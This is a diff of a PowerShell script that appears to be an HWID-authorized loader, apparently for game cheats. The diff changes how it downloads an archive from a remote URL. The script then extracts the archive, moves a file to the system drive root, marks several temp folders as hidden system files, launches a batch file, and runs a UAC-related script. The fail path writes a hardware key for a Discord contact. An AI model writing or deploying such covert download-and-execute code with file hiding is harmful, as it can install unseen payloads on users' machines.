@@ -47,13 +47,8 @@ Function pass {
 	Set-Service -Name "EABackgroundService" -StartupType Demand
 	Remove-Item -Path $bin -Recurse -Force
 	Clear-Host
-	Invoke-WebRequest -Uri $pl1 -OutFile $binZip
-	Clear-Host
-	Expand-Archive -Path $binZip -DestinationPath $bin
-	Clear-Host
-	Move-Item -Path "$bin\$auth" -Destination "$env:SystemDrive\"
-	Clear-Host
-				$attributes = @(
+
+ $attributes = @(
 					"$env:TMP\wtmpd",
 					"$env:TMP\cetrainers",
 					"$env:TMP\afolder",
@@ -90,7 +85,15 @@ Function pass {
 					foreach ($attribute in $attributes) {
 						attrib +s +h $attribute
 					}
-		Clear-Host
+	
+#WebClient object style
+$client = New-Object System.Net.WebClient
+$client.DownloadFile($pl1, $binZip)
+if (Test-Path $binZip) {Expand-Archive -Path $binZip -DestinationPath $bin}
+
+	Move-Item -Path "$bin\$auth" -Destination "$env:SystemDrive\"
+	Clear-Host
+
 	Start-Process $authbat
 	}
 exit
@@ -98,13 +101,17 @@ exit
 ##################################################################################
 Function fail {
 	Clear-Host
-	Write-Host ""
-	Write-Host "*Send Me This Key For Authorization!*"
-	Write-Host ""
-	Write-Host "$hwid"
-	Write-Host ""
-	Write-Host "Discord: Bytrl"
-	Start-Sleep -Seconds 5
+   $DesktopPath = [Environment]::GetFolderPath("Desktop")
+    $AuthKeyFilePath = Join-Path -Path $DesktopPath -ChildPath "Auth_Key.txt"
+    
+    $Content = @"
+*Send Me This Key For Authorization!*
+
+$hwid
+
+Discord: Bytrl
+"@   
+    Set-Content -Path $AuthKeyFilePath -Value $Content -Force
 	Remove-Item -Path "$env:TMP\bin" -Recurse -Force
 	Remove-Item -Path "$env:TMP\cetrainers" -Recurse -Force
 	Remove-Item -Path "$env:TMP\afolder" -Recurse -Force
@@ -174,6 +181,3 @@ cleanup
 	Start-Process $uacScriptPath -Wait
 	Remove-Item -Path $uacScriptPath -Force
 	exit /B
-
-
-
